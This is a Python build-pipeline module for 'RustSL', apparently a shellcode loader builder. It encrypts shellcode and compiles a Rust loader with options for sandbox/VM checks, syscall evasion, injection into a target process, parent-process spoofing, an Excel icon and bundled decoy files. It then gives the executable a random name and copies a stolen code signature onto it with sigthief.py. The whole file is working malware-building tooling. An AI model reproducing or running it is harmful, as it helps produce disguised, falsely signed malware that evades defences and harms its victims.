"""Build pipeline helpers for the RustSL NiceGUI app."""

import asyncio
import os
import random
import shutil
import string
import subprocess
import sys
from pathlib import Path
from typing import Any, Dict, List, Tuple

from config_loader import ROOT


def _run_subprocess_sync(cmd: List[str], env: Dict[str, str] | None, cwd: Path | None) -> Tuple[int, str, str]:
    try:
        # Use subprocess.run synchronously, mimicking the GUI's behavior
        result = subprocess.run(
            cmd,
            env=env,
            cwd=str(cwd) if cwd else None,
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore'
        )
        return result.returncode, result.stdout, result.stderr
    except Exception as e:
        return -1, "", str(e)


async def run_subprocess(cmd: List[str], env: Dict[str, str] | None, log_fn, cwd: Path | None = None) -> Tuple[int, str, str]:
    # Offload the blocking subprocess call to a thread to avoid asyncio loop issues on Windows
    rc, stdout, stderr = await asyncio.to_thread(_run_subprocess_sync, cmd, env, cwd)
    
    if stdout:
        log_fn(stdout)
    if stderr:
        log_fn(stderr)
    return rc, stdout, stderr


def build_features(params: Dict[str, Any], fmap: Dict[str, Dict[str, str]]) -> List[str]:
    feats: List[str] = []

    vm_ids = params.get("vm_checks", "").split(",") if params.get("vm_checks") else []
    feats.extend([fmap["vm_checks_map"].get(vid) for vid in vm_ids if fmap["vm_checks_map"].get(vid)])

    enc_id = params.get("enc_method") or ""
    ef = fmap["encryption_feature_map"].get(enc_id)
    if ef:
        feats.append(ef)

    encd_id = params.get("encode_method") or ""
    edf = fmap["encoding_feature_map"].get(encd_id)
    if edf:
        feats.append(edf)

    run_id = params.get("run_mode") or ""
    rf = fmap["run_mode_map"].get(run_id)
    if rf:
        feats.append(rf)

    mem_id = params.get("mem_mode") or ""
    mf = fmap["alloc_mem_feature_map"].get(mem_id)
    if mf:
        feats.append(mf)

    lp_id = params.get("load_payload_mode") or ""
    lpf = fmap["load_payload_feature_map"].get(lp_id)
    if lpf:
        feats.append(lpf)

    sc_id = params.get("syscall_method") or ""
    scf = fmap["syscall_feature_map"].get(sc_id)
    if scf:
        feats.append(scf)

    if params.get("forgery_enable"):
        feats.append("with_bundling")
    if params.get("win7_compat"):
        feats.append("win7")
    if params.get("debug_mode"):
        feats.append("debug")
    if params.get("enable_ppid_spoofing"):
        feats.append("ppid_spoofing")

    seen = set()
    ordered: List[str] = []
    for f in feats:
        if f and f not in seen:
            seen.add(f)
            ordered.append(f)
    return ordered


async def encrypt_payload(params: Dict[str, Any], fmap: Dict[str, Dict[str, str]], log_fn, progress_fn):
    (ROOT / "output").mkdir(exist_ok=True)
    progress_fn(0)
    log_fn("Encrypting...")

    enc_arg = fmap["encryption_map"].get(params["enc_method"], params["enc_method"])

    # Resolve input path (prefer absolute, else fall back to ROOT/input/<name>)
    inp = Path(params["input_bin"])
    if not inp.is_absolute():
        candidate = ROOT / "input" / params["input_bin"]
        if candidate.exists():
            inp = candidate
    if not inp.exists():
        raise FileNotFoundError(f"Input shellcode not found: {inp}")

    cmd = [
        sys.executable,
        "encrypt.py",
        "-i",
        str(inp),
        "-o",
        "output/encrypt.bin",
        "-m",
        enc_arg,
        "-e",
        params.get("encode_method", "base64"),
    ]
    log_fn(f"Encrypt cmd: {' '.join(cmd)}")
    rc, stdout, stderr = await run_subprocess(cmd, os.environ.copy(), log_fn, cwd=ROOT)
    log_fn(f"Encrypt rc={rc}")
    if rc != 0:
        err = (stderr or "").strip() or (stdout or "").strip() or f"Encrypt step failed (rc={rc})"
        raise RuntimeError(err)
    progress_fn(40)


async def build_rust(params: Dict[str, Any], manifest: Dict[str, Any], fmap: Dict[str, Dict[str, str]], log_fn, progress_fn) -> str:
    log_fn("Building Rust project...")
    target = params.get("target", "x86_64-pc-windows-msvc")
    features = build_features(params, fmap)
    features_str = ",".join(features)
    log_fn(f"Features enabled: {features_str}")
    log_fn(f"Build target: {target}")

    env = os.environ.copy()
    env_overrides: Dict[str, str] = {}
    run_modes = manifest.get("run_modes", [])
    pattern = 1
    for rm in run_modes:
        if rm.get("id") == params.get("run_mode"):
            pattern = rm.get("pattern", 1)
            break
    if pattern == 2:
        env["RSL_TARGET_PROGRAM"] = params.get("target_program", "notepad.exe")
        env_overrides["RSL_TARGET_PROGRAM"] = env["RSL_TARGET_PROGRAM"]
    elif pattern == 3:
        env["RSL_TARGET_PID"] = params.get("target_pid", "0")
        env_overrides["RSL_TARGET_PID"] = env["RSL_TARGET_PID"]

    if params.get("enable_ppid_spoofing"):
        env["RSL_PARENT_PROCESS_NAME"] = params.get("parent_process_name", "explorer.exe")
        env_overrides["RSL_PARENT_PROCESS_NAME"] = env["RSL_PARENT_PROCESS_NAME"]

    env["RSL_ICON_PATH"] = params.get("icon_path", "icons/excel.ico")
    env_overrides["RSL_ICON_PATH"] = env["RSL_ICON_PATH"]

    if params.get("load_payload_mode") in ["cmdline", "separate"]:
        default_addr = params.get("default_payload_address", "encrypt.bin")
        if default_addr.strip():
            env["RSL_DEFAULT_PAYLOAD_ADDRESS"] = default_addr.strip()
            env_overrides["RSL_DEFAULT_PAYLOAD_ADDRESS"] = env["RSL_DEFAULT_PAYLOAD_ADDRESS"]

    if params.get("forgery_enable"):
        bundle_file = params.get("bundle_file", "")
        if not bundle_file:
            raise ValueError("File bundling is enabled, but no bundle file was selected!")
        env["RSL_BUNDLE_FILE"] = bundle_file
        env["RSL_BUNDLE_FILENAME"] = os.path.basename(bundle_file)
        env_overrides["RSL_BUNDLE_FILE"] = env["RSL_BUNDLE_FILE"]
        env_overrides["RSL_BUNDLE_FILENAME"] = env["RSL_BUNDLE_FILENAME"]

    cmd = [
        "cargo",
        "build",
        "--release",
        "--no-default-features",
        "--target",
        target,
        f"--features={features_str}",
    ]
    rc, _, _ = await run_subprocess(cmd, env, log_fn, cwd=ROOT)
    if rc != 0:
        env_prefix = " ".join([f"{k}={v}" for k, v in env_overrides.items()])
        cmd_display = f"{env_prefix} {' '.join(cmd)}".strip()
        raise RuntimeError(f"Build failed. To debug, run: {cmd_display}")
    progress_fn(60)
    env_prefix = " ".join([f"{k}={v}" for k, v in env_overrides.items()])
    return f"{env_prefix} {' '.join(cmd)}".strip()


def copy_output(params: Dict[str, Any]) -> str:
    target = params.get("target", "x86_64-pc-windows-msvc")
    src = ROOT / "target" / target / "release" / "rsl.exe"
    out_dir = ROOT / "output"
    out_dir.mkdir(exist_ok=True)
    if not src.exists():
        raise FileNotFoundError(str(src))
    rand_name = "".join(random.choices(string.ascii_letters, k=6)) + ".exe"
    dst = out_dir / rand_name
    shutil.copyfile(src, dst)
    return str(dst)


async def sign_executable(dst_file: str, sign_app: str, log_fn, progress_fn):
    log_fn("Signing executable...")
    sign_out_file = dst_file[:-4] + "_signed.exe"
    cmd = [
        sys.executable,
        str(ROOT / "sign" / "sigthief.py"),
        "-i",
        sign_app,
        "-t",
        dst_file,
        "-o",
        sign_out_file,
    ]
    rc, _, _ = await run_subprocess(cmd, os.environ.copy(), log_fn)
    if rc != 0:
        raise RuntimeError("Sign step failed")
    shutil.move(sign_out_file, dst_file)
    progress_fn(95)


__all__ = [
    "run_subprocess",
    "build_features",
    "encrypt_payload",
    "build_rust",
    "copy_output",
    "sign_executable",
]
